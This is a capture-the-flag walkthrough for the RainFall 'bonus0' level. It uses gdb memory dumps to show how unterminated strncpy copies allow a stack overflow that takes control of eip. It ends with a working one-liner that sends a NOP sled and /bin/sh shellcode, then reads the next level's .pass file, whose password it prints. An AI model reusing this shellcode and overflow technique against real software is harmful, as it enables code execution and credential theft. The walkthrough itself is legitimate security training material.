bonus0 takes 2 strings as parameter from stdin and display them.

bonus0@RainFall:~$ ./bonus0
 -
salut
 -
ca va?
salut ca va?


In the assembly we can see the reading is made with the read function :
(gdb) disass p
Dump of assembler code for function p:
		...
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   		...

Then copies the 20 first with strncpy :

0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>

We send as input some "A" and set a breackpoint to the end of the function p :

(gdb) b * p + 104
Breakpoint 1 at 0x804851c
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

(gdb) disass
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax)
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
=> 0x0804851c <+104>:	leave
   0x0804851d <+105>:	ret
End of assembler dump.
(gdb) i r
eax            0xbffff678	-1073744264
ecx            0xb7eb9aa0	-1209296224
edx            0x41414141	1094795585
ebx            0xb7fd0ff4	-1208152076
esp            0xbfffe630	0xbfffe630
ebp            0xbffff648	0xbffff648
esi            0x0	0
edi            0x0	0
eip            0x804851c	0x804851c <p+104>
eflags         0x200287	[ CF PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

With the return address from strncpy we display s1 :

(gdb) x/100x 0xbffff678
0xbffff678:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff688:	0x41414141	0xb7e5ec73	0x0804829c	0x00000000
0xbffff698:	0x00ca0000	0x00000001	0xb7fd0ff4	0x00000000
0xbffff6a8:	0xbffff6f8	0x080485b9	0xbffff6c6	0x080498d8
0xbffff6b8:	0x00000001	0x0804835d	0xb7fd13e4	0x0000000d
0xbffff6c8:	0x080498d8	0x080485f1	0xffffffff	0xb7e5edc6
				...
And then we display the buffer from read :

(gdb) x/100x $ebp - 0x1008
0xbfffe640:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe650:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6c0:	0x00004141	0x00000000	0x00000000	0x00000000
0xbfffe6d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe6e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe6f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe700:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe710:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe720:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe730:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe740:	0x00000000	0x00000000	0x00000000	0x00000000

We test with S2:

(gdb) c
Continuing.
 -
BBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 1, 0x0804851c in p ()
(gdb) x/100x $ebp - 0x1008
0xbfffe640:	0x42424242	0x42424242	0x42424242	0x42424242
0xbfffe650:	0x42424242	0x42424242	0x41410042	0x41414141
0xbfffe660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6c0:	0x00004141	0x00000000	0x00000000	0x00000000
0xbfffe6d0:	0x00000000	0x00000000	0x00000000	0x00000000
			...
(gdb) i r
eax            0xbffff68c	-1073744244
			...

(gdb) x/100x 0xbffff68c
0xbffff68c:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff69c:	0x42424242	0xb7fd0ff4	0x00000000	0xbffff6f8
0xbffff6ac:	0x080485b9	0xbffff6c6	0x080498d8	0x00000001

We display s2 - 10 to see what's behind :

(gdb) x/100x 0xbffff68c - 10
0xbffff682:	0x41414141	0x41414141	0x42424141	0x42424242
0xbffff692:	0x42424242	0x42424242	0x42424242	0x0ff44242
0xbffff6a2:	0x0000b7fd	0xf6f80000	0x85b9bfff	0xf6c60804
0xbffff6b2:	0x98d8bfff	0x00010804	0x835d0000	0x13e40804

We can see that strncpy doesn't copy the NULL char (\0) if there is not
and that both strings are followed in memory.

(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

By keep moving forward we can see that we have control on the eip.

bonus0@RainFall:~$ readelf -a bonus0 | grep "STACK"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4

As we can see the stack is executable :
We are going to put our shellcode in the read's buffer and redirect it to our shellcode.

We send NOPs + our shellcode on the first read.

(gdb) r
 -
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS

Breakpoint 1, 0x0804851c in p ()
(gdb) x/100x $ebp - 0x1008
0xbfffe620:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe630:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe640:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe650:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe660:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe670:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe680:	0x4e4e4e4e	0x53535353	0x53535353	0x53535353
0xbfffe690:	0x53535353	0x53535353	0x53535353	0x53535353
0xbfffe6a0:	0x53535353	0x53535353	0x53535353	0x00000000
0xbfffe6b0:	0x00000000	0x00000000	0x00000000	0x00000000

At the second read, we fill s2's buffer + an address in the NOP area to redirect on our shellcode.

(gdb) c
 -
BBBBBBBBBBBBBBAAAA

Breakpoint 1, 0x0804851c in p ()
(gdb) x/100x $ebp - 0x1008
0xbfffe620:	0x42424242	0x42424242	0x42424242	0x41414242
0xbfffe630:	0x4e004141	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe640:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe650:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe660:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe670:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe680:	0x4e4e4e4e	0x53535353	0x53535353	0x53535353
0xbfffe690:	0x53535353	0x53535353	0x53535353	0x53535353
0xbfffe6a0:	0x53535353	0x53535353	0x53535353	0x00000000
(gdb) c
Continuing.
NNNNNNNNNNNNNNNNNNNNBBBBBBBBBBBBBBAAAA BBBBBBBBBBBBBBAAAA

Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()

We can clearly see that our eip value is wrong.

This is linked to the behavior of strncpy, by reading the man we understand that if 
source's len is smaller than len (20) then strncpy fill destination with "\0" till len.
That explains the 0x00414141 where 00 is a \0.
As we send 18 + "\n" = 19 characteres, there is 1 more character needed which is filled by a \0 by strncpy.

We then add a B to fill properly the buffer with strncpy without adding a \0.

(gdb) c
BBBBBBBBBBBBBBAAAAB

Breakpoint 1, 0x0804851c in p ()
(gdb) x/100x $ebp - 0x1008
0xbfffe620:	0x42424242	0x42424242	0x42424242	0x41414242
0xbfffe630:	0x00424141	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe640:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe650:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe660:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe670:	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e	0x4e4e4e4e
0xbfffe680:	0x4e4e4e4e	0x53535353	0x53535353	0x53535353
0xbfffe690:	0x53535353	0x53535353	0x53535353	0x53535353
0xbfffe6a0:	0x53535353	0x53535353	0x53535353	0x00000000

(gdb) c
NNNNNNNNNNNNNNNNNNNNBBBBBBBBBBBBBBAAAAB BBBBBBBBBBBBBBAAAAB

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

Now we need to use the real value to exploit the binary :

bonus0@RainFall:~$ (python -c 'print ("\x90" * 300 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")' ; python -c 'print ("B" * 14 + "\x80\xe7\xff\xbf" + "B")' ; cat) | ./bonus0
 -
 -
��������������������BBBBBBBBBBBBBB����B BBBBBBBBBBBBBB����B
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
